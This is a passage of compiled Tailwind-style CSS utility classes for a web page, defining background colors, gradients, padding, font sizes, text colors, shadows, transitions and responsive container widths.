            background-color: rgb(246 255 249/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F7A633\] {
            --tw-bg-opacity: 1;
            background-color: rgb(247 166 51/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F7F8FA\] {
            --tw-bg-opacity: 1;
            background-color: rgb(247 248 250/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F8F8F8\] {
            --tw-bg-opacity: 1;
            background-color: rgb(248 248 248/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#F9F9F9\] {
            --tw-bg-opacity: 1;
            background-color: rgb(249 249 249/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FAFAFA\] {
            --tw-bg-opacity: 1;
            background-color: rgb(250 250 250/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FBC229\] {
            --tw-bg-opacity: 1;
            background-color: rgb(251 194 41/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FDE3E4\] {
            --tw-bg-opacity: 1;
            background-color: rgb(253 227 228/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FFF5F3\] {
            --tw-bg-opacity: 1;
            background-color: rgb(255 245 243/var(--tw-bg-opacity, 1))
        }

        .bg-\[\#FFF8EC\] {
            --tw-bg-opacity: 1;
            background-color: rgb(255 248 236/var(--tw-bg-opacity, 1))
        }

        .bg-black {
            --tw-bg-opacity: 1;
            background-color: rgb(0 0 0/var(--tw-bg-opacity, 1))
        }

        .bg-blue-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(219 234 254/var(--tw-bg-opacity, 1))
        }

        .bg-bw-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1))
        }

        .bg-bw-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(207 207 207/var(--tw-bg-opacity, 1))
        }

        .bg-bw-300 {
            --tw-bg-opacity: 1;
            background-color: rgb(182 182 182/var(--tw-bg-opacity, 1))
        }

        .bg-bw-400 {
            --tw-bg-opacity: 1;
            background-color: rgb(158 158 158/var(--tw-bg-opacity, 1))
        }

        .bg-bw-500 {
            --tw-bg-opacity: 1;
            background-color: rgb(134 134 134/var(--tw-bg-opacity, 1))
        }

        .bg-bw-900 {
            --tw-bg-opacity: 1;
            background-color: rgb(37 37 37/var(--tw-bg-opacity, 1))
        }

        .bg-danger-main {
            --tw-bg-opacity: 1;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1))
        }

        .bg-gray-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(243 244 246/var(--tw-bg-opacity, 1))
        }

        .bg-gray-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(229 231 235/var(--tw-bg-opacity, 1))
        }

        .bg-gray-400 {
            --tw-bg-opacity: 1;
            background-color: rgb(156 163 175/var(--tw-bg-opacity, 1))
        }

        .bg-primary {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        .bg-primary-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1))
        }

        .bg-primary-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(204 222 238/var(--tw-bg-opacity, 1))
        }

        .bg-primary-focus {
            --tw-bg-opacity: 1;
            background-color: rgb(77 139 196/var(--tw-bg-opacity, 1))
        }

        .bg-secondary-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(254 238 212/var(--tw-bg-opacity, 1))
        }

        .bg-secondary-900 {
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
        }

        .bg-slate-200 {
            --tw-bg-opacity: 1;
            background-color: rgb(226 232 240/var(--tw-bg-opacity, 1))
        }

        .bg-slate-50 {
            --tw-bg-opacity: 1;
            background-color: rgb(248 250 252/var(--tw-bg-opacity, 1))
        }

        .bg-success-main {
            --tw-bg-opacity: 1;
            background-color: rgb(29 153 120/var(--tw-bg-opacity, 1))
        }

        .bg-transparent {
            background-color: transparent
        }

        .bg-warning-surface {
            --tw-bg-opacity: 1;
            background-color: rgb(253 228 194/var(--tw-bg-opacity, 1))
        }

        .bg-white {
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
        }

        .bg-opacity-25 {
            --tw-bg-opacity: .25
        }

        .bg-opacity-50 {
            --tw-bg-opacity: .5
        }

        .bg-opacity-90 {
            --tw-bg-opacity: .9
        }

        .bg-gradient-to-l {
            background-image: linear-gradient(to left, var(--tw-gradient-stops))
        }

        .bg-gradient-to-r {
            background-image: linear-gradient(to right, var(--tw-gradient-stops))
        }

        .bg-gradient-to-t {
            background-image: linear-gradient(to top, var(--tw-gradient-stops))
        }

        .\!from-danger-main {
            --tw-gradient-from: #ec213d var(--tw-gradient-from-position) !important;
            --tw-gradient-to: rgba(236, 33, 61, 0) var(--tw-gradient-to-position) !important;
            --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to) !important
        }

        .from-\[\$\{themeData\.bg_color\}\] {
            --tw-gradient-from:$ {
                themeData.bg color
            }

            var(--tw-gradient-from-position);
            --tw-gradient-to:hsla(0, 0%, 100%, 0) var(--tw-gradient-to-position);
            --tw-gradient-stops:var(--tw-gradient-from),
            var(--tw-gradient-to)
        }

        .from-primary {
            --tw-gradient-from: #005aab var(--tw-gradient-from-position);
            --tw-gradient-to: rgba(0, 90, 171, 0) var(--tw-gradient-to-position);
            --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to)
        }

        .from-white {
            --tw-gradient-from: #fff var(--tw-gradient-from-position);
            --tw-gradient-to: hsla(0, 0%, 100%, 0) var(--tw-gradient-to-position);
            --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to)
        }

        .from-50\% {
            --tw-gradient-from-position: 50%
        }

        .\!to-danger-main {
            --tw-gradient-to: #ec213d var(--tw-gradient-to-position) !important
        }

        .to-\[\#E6EFF6\] {
            --tw-gradient-to: #e6eff6 var(--tw-gradient-to-position)
        }

        .to-bw-500 {
            --tw-gradient-to: #868686 var(--tw-gradient-to-position)
        }

        .to-bw-800 {
            --tw-gradient-to: #3d3d3d var(--tw-gradient-to-position)
        }

        .to-bw-900 {
            --tw-gradient-to: #252525 var(--tw-gradient-to-position)
        }

        .to-transparent {
            --tw-gradient-to: transparent var(--tw-gradient-to-position)
        }

        .to-50\% {
            --tw-gradient-to-position: 50%
        }

        .bg-cover {
            background-size: cover
        }

        .bg-center {
            background-position: 50%
        }

        .fill-primary {
            fill: #005aab
        }

        .object-contain {
            -o-object-fit: contain;
            object-fit: contain
        }

        .object-cover {
            -o-object-fit: cover;
            object-fit: cover
        }

        .object-center {
            -o-object-position: center;
            object-position: center
        }

        .\!p-0 {
            padding: 0 !important
        }

        .p-0 {
            padding: 0
        }

        .p-1 {
            padding: .25rem
        }

        .p-2 {
            padding: .5rem
        }

        .p-3 {
            padding: .75rem
        }

        .p-4 {
            padding: 1rem
        }

        .p-5 {
            padding: 1.25rem
        }

        .p-6 {
            padding: 1.5rem
        }

        .p-8 {
            padding: 2rem
        }

        .p-\[1px\] {
            padding: 1px
        }

        .\!px-0 {
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        .\!px-12 {
            padding-left: 3rem !important;
            padding-right: 3rem !important
        }

        .\!px-14 {
            padding-left: 3.5rem !important;
            padding-right: 3.5rem !important
        }

        .\!px-16 {
            padding-left: 4rem !important;
            padding-right: 4rem !important
        }

        .\!px-2 {
            padding-left: .5rem !important;
            padding-right: .5rem !important
        }

        .\!px-3 {
            padding-left: .75rem !important;
            padding-right: .75rem !important
        }

        .\!px-4 {
            padding-left: 1rem !important;
            padding-right: 1rem !important
        }

        .\!px-6 {
            padding-left: 1.5rem !important;
            padding-right: 1.5rem !important
        }

        .\!py-2 {
            padding-bottom: .5rem !important;
            padding-top: .5rem !important
        }

        .px-0 {
            padding-left: 0;
            padding-right: 0
        }

        .px-1 {
            padding-left: .25rem;
            padding-right: .25rem
        }

        .px-2 {
            padding-left: .5rem;
            padding-right: .5rem
        }

        .px-3 {
            padding-left: .75rem;
            padding-right: .75rem
        }

        .px-4 {
            padding-left: 1rem;
            padding-right: 1rem
        }

        .px-5 {
            padding-left: 1.25rem;
            padding-right: 1.25rem
        }

        .px-6 {
            padding-left: 1.5rem;
            padding-right: 1.5rem
        }

        .px-8 {
            padding-left: 2rem;
            padding-right: 2rem
        }

        .py-1 {
            padding-bottom: .25rem;
            padding-top: .25rem
        }

        .py-10 {
            padding-bottom: 2.5rem;
            padding-top: 2.5rem
        }

        .py-12 {
            padding-bottom: 3rem;
            padding-top: 3rem
        }

        .py-16 {
            padding-bottom: 4rem;
            padding-top: 4rem
        }

        .py-2 {
            padding-bottom: .5rem;
            padding-top: .5rem
        }

        .py-20 {
            padding-bottom: 5rem;
            padding-top: 5rem
        }

        .py-3 {
            padding-bottom: .75rem;
            padding-top: .75rem
        }

        .py-4 {
            padding-bottom: 1rem;
            padding-top: 1rem
        }

        .py-5 {
            padding-bottom: 1.25rem;
            padding-top: 1.25rem
        }

        .py-6 {
            padding-bottom: 1.5rem;
            padding-top: 1.5rem
        }

        .py-7 {
            padding-bottom: 1.75rem;
            padding-top: 1.75rem
        }

        .py-8 {
            padding-bottom: 2rem;
            padding-top: 2rem
        }

        .py-9 {
            padding-bottom: 2.25rem;
            padding-top: 2.25rem
        }

        .py-\[10px\] {
            padding-bottom: 10px;
            padding-top: 10px
        }

        .py-\[11px\] {
            padding-bottom: 11px;
            padding-top: 11px
        }

        .\!pl-10 {
            padding-left: 2.5rem !important
        }

        .\!pl-12 {
            padding-left: 3rem !important
        }

        .\!pl-16 {
            padding-left: 4rem !important
        }

        .\!pl-8 {
            padding-left: 2rem !important
        }

        .\!pl-\[3\.5rem\] {
            padding-left: 3.5rem !important
        }

        .pb-1 {
            padding-bottom: .25rem
        }

        .pb-12 {
            padding-bottom: 3rem
        }

        .pb-16 {
            padding-bottom: 4rem
        }

        .pb-2 {
            padding-bottom: .5rem
        }

        .pb-3 {
            padding-bottom: .75rem
        }

        .pb-4 {
            padding-bottom: 1rem
        }

        .pb-5 {
            padding-bottom: 1.25rem
        }

        .pb-6 {
            padding-bottom: 1.5rem
        }

        .pb-8 {
            padding-bottom: 2rem
        }

        .pb-\[450px\] {
            padding-bottom: 450px
        }

        .pb-\[env\(safe-area-inset-bottom\)\] {
            padding-bottom: env(safe-area-inset-bottom)
        }

        .pl-1 {
            padding-left: .25rem
        }

        .pl-2 {
            padding-left: .5rem
        }

        .pl-3 {
            padding-left: .75rem
        }

        .pl-4 {
            padding-left: 1rem
        }

        .pl-5 {
            padding-left: 1.25rem
        }

        .pl-8 {
            padding-left: 2rem
        }

        .pl-\[2px\] {
            padding-left: 2px
        }

        .pr-1 {
            padding-right: .25rem
        }

        .pr-12 {
            padding-right: 3rem
        }

        .pr-2 {
            padding-right: .5rem
        }

        .pr-3 {
            padding-right: .75rem
        }

        .pr-4 {
            padding-right: 1rem
        }

        .pr-8 {
            padding-right: 2rem
        }

        .pr-\[10px\] {
            padding-right: 10px
        }

        .pt-0 {
            padding-top: 0
        }

        .pt-1 {
            padding-top: .25rem
        }

        .pt-10 {
            padding-top: 2.5rem
        }

        .pt-12 {
            padding-top: 3rem
        }

        .pt-16 {
            padding-top: 4rem
        }

        .pt-2 {
            padding-top: .5rem
        }

        .pt-28 {
            padding-top: 7rem
        }

        .pt-3 {
            padding-top: .75rem
        }

        .pt-4 {
            padding-top: 1rem
        }

        .pt-5 {
            padding-top: 1.25rem
        }

        .pt-6 {
            padding-top: 1.5rem
        }

        .pt-8 {
            padding-top: 2rem
        }

        .pt-\[2px\] {
            padding-top: 2px
        }

        .text-left {
            text-align: left
        }

        .text-center {
            text-align: center
        }

        .text-right {
            text-align: right
        }

        .font-sans {
            font-family: ui-sans-serif, system-ui, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji
        }

        .\!text-base {
            font-size: 1rem !important;
            line-height: 1.5rem !important
        }

        .\!text-sm {
            font-size: .875rem !important;
            line-height: 1.25rem !important
        }

        .\!text-xs {
            font-size: .75rem !important;
            line-height: 1rem !important
        }

        .text-2xl {
            font-size: 1.5rem;
            line-height: 2rem
        }

        .text-3xl {
            font-size: 1.875rem;
            line-height: 2.25rem
        }

        .text-4xl {
            font-size: 2.25rem;
            line-height: 2.5rem
        }

        .text-5xl {
            font-size: 3rem;
            line-height: 1
        }

        .text-\[10px\] {
            font-size: 10px
        }

        .text-\[12px\] {
            font-size: 12px
        }

        .text-\[16px\] {
            font-size: 16px
        }

        .text-\[40px\] {
            font-size: 40px
        }

        .text-\[8px\] {
            font-size: 8px
        }

        .text-\[9px\] {
            font-size: 9px
        }

        .text-base {
            font-size: 1rem;
            line-height: 1.5rem
        }

        .text-lg {
            font-size: 1.125rem;
            line-height: 1.75rem
        }

        .text-sm {
            font-size: .875rem;
            line-height: 1.25rem
        }

        .text-xl {
            font-size: 1.25rem;
            line-height: 1.75rem
        }

        .text-xs {
            font-size: .75rem;
            line-height: 1rem
        }

        .\!font-normal {
            font-weight: 400 !important
        }

        .font-bold {
            font-weight: 700
        }

        .font-light {
            font-weight: 300
        }

        .font-medium {
            font-weight: 500
        }

        .font-normal {
            font-weight: 400
        }

        .font-semibold {
            font-weight: 600
        }

        .capitalize {
            text-transform: capitalize
        }

        .italic {
            font-style: italic
        }

        .leading-tight {
            line-height: 1.25
        }

        .\!text-bw-500 {
            --tw-text-opacity: 1 !important;
            color: rgb(134 134 134/var(--tw-text-opacity, 1)) !important
        }

        .\!text-danger-main {
            --tw-text-opacity: 1 !important;
            color: rgb(236 33 61/var(--tw-text-opacity, 1)) !important
        }

        .\!text-primary {
            --tw-text-opacity: 1 !important;
            color: rgb(0 90 171/var(--tw-text-opacity, 1)) !important
        }

        .\!text-success-main {
            --tw-text-opacity: 1 !important;
            color: rgb(29 153 120/var(--tw-text-opacity, 1)) !important
        }

        .text-\[\#00000073\] {
            color: #00000073
        }

        .text-\[\#161616\] {
            --tw-text-opacity: 1;
            color: rgb(22 22 22/var(--tw-text-opacity, 1))
        }

        .text-\[\#1890FF\] {
            --tw-text-opacity: 1;
            color: rgb(24 144 255/var(--tw-text-opacity, 1))
        }

        .text-\[\#27303A\] {
            --tw-text-opacity: 1;
            color: rgb(39 48 58/var(--tw-text-opacity, 1))
        }

        .text-\[\#353535\] {
            --tw-text-opacity: 1;
            color: rgb(53 53 53/var(--tw-text-opacity, 1))
        }

        .text-\[\#4C4C4C\] {
            --tw-text-opacity: 1;
            color: rgb(76 76 76/var(--tw-text-opacity, 1))
        }

        .text-\[\#646464\] {
            --tw-text-opacity: 1;
            color: rgb(100 100 100/var(--tw-text-opacity, 1))
        }

        .text-\[\#797979\] {
            --tw-text-opacity: 1;
            color: rgb(121 121 121/var(--tw-text-opacity, 1))
        }

        .text-\[\#868686\] {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .text-\[\#898989\] {
            --tw-text-opacity: 1;
            color: rgb(137 137 137/var(--tw-text-opacity, 1))
        }

        .text-\[\#CA2D33\] {
            --tw-text-opacity: 1;
            color: rgb(202 45 51/var(--tw-text-opacity, 1))
        }

        .text-\[\#DA001A\] {
            --tw-text-opacity: 1;
            color: rgb(218 0 26/var(--tw-text-opacity, 1))
        }

        .text-\[\#E0E0E7\] {
            --tw-text-opacity: 1;
            color: rgb(224 224 231/var(--tw-text-opacity, 1))
        }

        .text-\[\#FF9F00\] {
            --tw-text-opacity: 1;
            color: rgb(255 159 0/var(--tw-text-opacity, 1))
        }

        .text-blue-400 {
            --tw-text-opacity: 1;
            color: rgb(96 165 250/var(--tw-text-opacity, 1))
        }

        .text-bw-200 {
            --tw-text-opacity: 1;
            color: rgb(207 207 207/var(--tw-text-opacity, 1))
        }

        .text-bw-300 {
            --tw-text-opacity: 1;
            color: rgb(182 182 182/var(--tw-text-opacity, 1))
        }

        .text-bw-400 {
            --tw-text-opacity: 1;
            color: rgb(158 158 158/var(--tw-text-opacity, 1))
        }

        .text-bw-500 {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .text-bw-600 {
            --tw-text-opacity: 1;
            color: rgb(110 110 110/var(--tw-text-opacity, 1))
        }

        .text-bw-700 {
            --tw-text-opacity: 1;
            color: rgb(86 86 86/var(--tw-text-opacity, 1))
        }

        .text-bw-800 {
            --tw-text-opacity: 1;
            color: rgb(61 61 61/var(--tw-text-opacity, 1))
        }

        .text-bw-900 {
            --tw-text-opacity: 1;
            color: rgb(37 37 37/var(--tw-text-opacity, 1))
        }

        .text-danger-main {
            --tw-text-opacity: 1;
            color: rgb(236 33 61/var(--tw-text-opacity, 1))
        }

        .text-gray-200 {
            --tw-text-opacity: 1;
            color: rgb(229 231 235/var(--tw-text-opacity, 1))
        }

        .text-gray-500 {
            --tw-text-opacity: 1;
            color: rgb(107 114 128/var(--tw-text-opacity, 1))
        }

        .text-gray-600 {
            --tw-text-opacity: 1;
            color: rgb(75 85 99/var(--tw-text-opacity, 1))
        }

        .text-gray-700 {
            --tw-text-opacity: 1;
            color: rgb(55 65 81/var(--tw-text-opacity, 1))
        }

        .text-gray-900 {
            --tw-text-opacity: 1;
            color: rgb(17 24 39/var(--tw-text-opacity, 1))
        }

        .text-primary {
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }

        .text-red-500 {
            --tw-text-opacity: 1;
            color: rgb(239 68 68/var(--tw-text-opacity, 1))
        }

        .text-success-main {
            --tw-text-opacity: 1;
            color: rgb(29 153 120/var(--tw-text-opacity, 1))
        }

        .text-warning-main {
            --tw-text-opacity: 1;
            color: rgb(247 166 51/var(--tw-text-opacity, 1))
        }

        .text-white {
            --tw-text-opacity: 1;
            color: rgb(255 255 255/var(--tw-text-opacity, 1))
        }

        .underline {
            text-decoration-line: underline
        }

        .line-through {
            text-decoration-line: line-through
        }

        .opacity-0 {
            opacity: 0
        }

        .opacity-40 {
            opacity: .4
        }

        .shadow {
            --tw-shadow: 0 1px 3px 0 rgba(0, 0, 0, .1), 0 1px 2px -1px rgba(0, 0, 0, .1);
            --tw-shadow-colored: 0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color)
        }

        .shadow,
        .shadow-lg {
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .shadow-lg {
            --tw-shadow: 0 10px 15px -3px rgba(0, 0, 0, .1), 0 4px 6px -4px rgba(0, 0, 0, .1);
            --tw-shadow-colored: 0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color)
        }

        .shadow-md {
            --tw-shadow: 0 4px 6px -1px rgba(0, 0, 0, .1), 0 2px 4px -2px rgba(0, 0, 0, .1);
            --tw-shadow-colored: 0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
        }

        .outline {
            outline-style: solid
        }

        .ring-1 {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .ring-primary {
            --tw-ring-opacity: 1;
            --tw-ring-color: rgb(0 90 171/var(--tw-ring-opacity, 1))
        }

        .\!ring-offset-4 {
            --tw-ring-offset-width: 4px !important
        }

        .blur {
            --tw-blur: blur(8px)
        }

        .blur,
        .brightness-50 {
            filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
        }

        .brightness-50 {
            --tw-brightness: brightness(.5)
        }

        .grayscale {
            --tw-grayscale: grayscale(100%)
        }

        .filter,
        .grayscale {
            filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
        }

        .transition {
            transition-duration: .25s;
            transition-property: color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-\[grid-template-rows\] {
            transition-duration: .25s;
            transition-property: grid-template-rows;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-\[padding-top\] {
            transition-duration: .25s;
            transition-property: padding-top;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-\[scale\] {
            transition-duration: .25s;
            transition-property: scale;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .transition-all {
            transition-duration: .25s;
            transition-property: all;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .duration-1000 {
            transition-duration: 1s
        }

        .duration-300 {
            transition-duration: .3s
        }

        .duration-500 {
            transition-duration: .5s
        }

        .ease-in {
            transition-timing-function: cubic-bezier(.4, 0, 1, 1)
        }

        .ease-in-out {
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        html {
            font: 400 14px var(--base-font-family);
            line-height: var(--base-line-height)
        }

        @media screen and (min-width:48em) {
            html {
                font-size: var(--base-font-size)
            }
        }

        .spinner {
            animation: spinning 1s infinite both;
            border: 5px solid rgba(0, 0, 0, .1);
            border-radius: 50%;
            border-top: 5px solid color-mix(in srgb, var(--primary-color), #fff 5%);
            display: block;
            height: 42px;
            width: 42px
        }

        @keyframes spinning {
            0% {
                transform: rotate(0)
            }

            to {
                transform: rotate(1turn)
            }
        }

        .v-enter-active,
        .v-leave-active {
            transition: opacity .5s ease
        }

        .v-enter-from,
        .v-leave-to {
            opacity: 0
        }

        .hover\:badge-primary:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(204 222 238/var(--tw-bg-opacity, 1));
            --tw-text-opacity: 1;
            color: rgb(51 123 188/var(--tw-text-opacity, 1))
        }

        @media not all and (min-width:1920px) {
            .max-3xl\:container-right {
                margin-left: max(4%, calc(50vw - 583px));
                margin-right: 0;
                width: auto
            }

            @media (min-width:768px) {
                .max-3xl\:container-right {
                    margin-left: max(3%, calc(50vw - 583px))
                }
            }
        }

        @media not all and (min-width:768px) {
            .max-md\:card {
                border-radius: .75rem;
                border-width: 1px
            }

            .max-md\:no-scrollbar::-webkit-scrollbar {
                display: none
            }

            .max-md\:no-scrollbar {
                -ms-overflow-style: none;
                scrollbar-width: none
            }
        }

        @media (min-width:768px) {
            .md\:container {
                width: 100%
            }

            @media (min-width:640px) {
                .md\:container {
                    max-width: 640px
                }
            }

            .md\:container {
                max-width: 768px
            }

            @media (min-width:1024px) {
                .md\:container {
                    max-width: 1024px
                }
            }

            @media (min-width:1280px) {
                .md\:container {
                    max-width: 1280px
                }
            }

            @media (min-width:1440px) {
                .md\:container {
                    max-width: 1440px
                }
            }

            @media (min-width:1920px) {
                .md\:container {
                    max-width: 1920px
                }
            }

            .md\:h5 {
                font-size: 1.25rem;
                font-weight: 700;
                line-height: 1.75rem;
                line-height: 1.375
            }

            .md\:h5 {
                font-size: 32px
            }

            .md\:container {
                margin-left: auto;
                margin-right: auto;
                max-width: 1166px;
                width: 92%
            }

            .md\:container {
                width: 94%
            }

            .md\:card {
                border-radius: .75rem;
                border-width: 1px
            }
        }

        @media (min-width:1920px) {
            .\33xl\:container {
                width: 100%
            }

            @media (min-width:640px) {
                .\33xl\:container {
                    max-width: 640px
                }
            }

            @media (min-width:768px) {
                .\33xl\:container {
                    max-width: 768px
                }
            }

            @media (min-width:1024px) {
                .\33xl\:container {
                    max-width: 1024px
                }
            }

            @media (min-width:1280px) {
                .\33xl\:container {
                    max-width: 1280px
                }
            }

            @media (min-width:1440px) {
                .\33xl\:container {
                    max-width: 1440px
                }
            }

            .\33xl\:container {
                max-width: 1920px
            }

            .\33xl\:container {
                margin-left: auto;
                margin-right: auto;
                max-width: 1166px;
                width: 92%
            }

            @media (min-width:768px) {
                .\33xl\:container {
                    width: 94%
                }
            }
        }

        .\*\:aspect-square>* {
            aspect-ratio: 1/1
        }

        .\*\:\!size-10>* {
            height: 2.5rem !important;
            width: 2.5rem !important
        }

        .\*\:\!size-5>* {
            height: 1.25rem !important;
            width: 1.25rem !important
        }

        .\*\:size-24>* {
            height: 6rem;
            width: 6rem
        }

        .\*\:h-full>* {
            height: 100%
        }

        .\*\:\!w-auto>* {
            width: auto !important
        }

        .\*\:w-full>* {
            width: 100%
        }

        .\*\:\!max-w-2xl>* {
            max-width: 42rem !important
        }

        .\*\:\!max-w-3xl>* {
            max-width: 48rem !important
        }

        .\*\:\!max-w-5xl>* {
            max-width: 64rem !important
        }

        .\*\:max-w-3xl>* {
            max-width: 48rem
        }

        .\*\:max-w-4xl>* {
            max-width: 56rem
        }

        .\*\:max-w-5xl>* {
            max-width: 64rem
        }

        .\*\:max-w-full>* {
            max-width: 100%
        }

        .\*\:max-w-lg>* {
            max-width: 32rem
        }

        .\*\:max-w-md>* {
            max-width: 28rem
        }

        .\*\:max-w-sm>* {
            max-width: 24rem
        }

        .\*\:max-w-xl>* {
            max-width: 36rem
        }

        .\*\:flex-1>* {
            flex: 1 1 0%
        }

        .\*\:flex-wrap>* {
            flex-wrap: wrap
        }

        .\*\:\!gap-2>* {
            gap: .5rem !important
        }

        .\*\:gap-0>* {
            gap: 0
        }

        .\*\:\*\:text-nowrap>*>* {
            text-wrap: nowrap
        }

        .\*\:\!border-none>* {
            border-style: none !important
        }

        .\*\:\!bg-danger-main>* {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(236 33 61/var(--tw-bg-opacity, 1)) !important
        }

        .\*\:\!bg-success-main>* {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(29 153 120/var(--tw-bg-opacity, 1)) !important
        }

        .\*\:\!bg-transparent>* {
            background-color: transparent !important
        }

        .\*\:\!bg-warning-main>* {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(247 166 51/var(--tw-bg-opacity, 1)) !important
        }

        .\*\:\!p-0>* {
            padding: 0 !important
        }

        .\*\:p-0>* {
            padding: 0
        }

        .\*\:\!px-0>* {
            padding-left: 0 !important;
            padding-right: 0 !important
        }

        .\*\:px-3>* {
            padding-left: .75rem;
            padding-right: .75rem
        }

        .\*\:text-center>* {
            text-align: center
        }

        .\*\:\!text-danger-main>* {
            --tw-text-opacity: 1 !important;
            color: rgb(236 33 61/var(--tw-text-opacity, 1)) !important
        }

        .\*\:\!shadow-none>* {
            --tw-shadow: 0 0 #0000 !important;
            --tw-shadow-colored: 0 0 #0000 !important;
            box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow) !important
        }

        .placeholder\:\!text-blue-400::-moz-placeholder {
            --tw-text-opacity: 1 !important;
            color: rgb(96 165 250/var(--tw-text-opacity, 1)) !important
        }

        .placeholder\:\!text-blue-400::placeholder {
            --tw-text-opacity: 1 !important;
            color: rgb(96 165 250/var(--tw-text-opacity, 1)) !important
        }

        .placeholder\:text-bw-500::-moz-placeholder {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .placeholder\:text-bw-500::placeholder {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .after\:absolute:after {
            content: var(--tw-content);
            position: absolute
        }

        .after\:start-\[2px\]:after {
            content: var(--tw-content);
            inset-inline-start: 2px
        }

        .after\:top-0\.5:after {
            content: var(--tw-content);
            top: .125rem
        }

        .after\:h-4:after {
            content: var(--tw-content);
            height: 1rem
        }

        .after\:w-4:after {
            content: var(--tw-content);
            width: 1rem
        }

        .after\:rounded-full:after {
            border-radius: 9999px;
            content: var(--tw-content)
        }

        .after\:border:after {
            border-width: 1px;
            content: var(--tw-content)
        }

        .after\:border-gray-300:after {
            content: var(--tw-content);
            --tw-border-opacity: 1;
            border-color: rgb(209 213 219/var(--tw-border-opacity, 1))
        }

        .after\:bg-white:after {
            content: var(--tw-content);
            --tw-bg-opacity: 1;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
        }

        .after\:transition-all:after {
            content: var(--tw-content);
            transition-duration: .25s;
            transition-property: all;
            transition-timing-function: cubic-bezier(.4, 0, .2, 1)
        }

        .after\:content-\[\'\'\]:after {
            --tw-content: "";
            content: var(--tw-content)
        }

        .last\:border-none:last-child {
            border-style: none
        }

        .odd\:bg-\[\#F8F8F8\]:nth-child(odd) {
            --tw-bg-opacity: 1;
            background-color: rgb(248 248 248/var(--tw-bg-opacity, 1))
        }

        .even\:bg-\[\#F9F9F9\]:nth-child(2n) {
            --tw-bg-opacity: 1;
            background-color: rgb(249 249 249/var(--tw-bg-opacity, 1))
        }

        .checked\:\!bg-primary:checked {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
        }

        .checked\:bg-primary:checked {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        .hover\:\!bg-primary:hover {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
        }

        .hover\:\!bg-white:hover {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(255 255 255/var(--tw-bg-opacity, 1)) !important
        }

        .hover\:bg-blue-100:hover {
            --tw-bg-opacity: 1;
